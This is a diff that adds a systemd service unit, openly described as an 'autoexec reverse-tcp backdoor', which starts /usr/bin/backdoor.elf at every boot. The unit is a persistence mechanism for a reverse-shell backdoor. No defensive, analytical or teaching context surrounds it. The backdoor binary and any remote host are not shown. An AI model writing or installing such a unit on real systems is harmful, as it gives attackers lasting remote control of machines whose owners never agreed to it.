@@ -1,0 +1,10 @@
+[Unit]
+Description=Autoexec reverse-tcp backdoor on startup
+After=multi-user.target
+
+[Service]
+ExecStart=/usr/bin/backdoor.elf
+Type=simple
+
+[Install]
+WantedBy=multi-user.target
